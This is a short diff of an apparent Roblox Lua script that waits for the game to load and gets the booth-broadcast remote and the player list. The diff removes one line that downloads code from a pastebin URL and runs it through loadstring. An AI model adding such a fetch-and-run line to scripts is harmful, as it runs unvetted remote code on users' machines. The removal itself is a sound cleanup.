@@ -8,7 +8,6 @@ Edmond: offered tips for optimization
 local osclock = os.clock()
 repeat task.wait() until game:IsLoaded()
 
-loadstring(game:HttpGet("https://pastebin.com/raw/dBzpKWQY"))()
 local Booths_Broadcast = game:GetService("ReplicatedStorage").Network:WaitForChild("Booths_Broadcast")
 local Players = game:GetService('Players')
 local getPlayers = Players:GetPlayers()
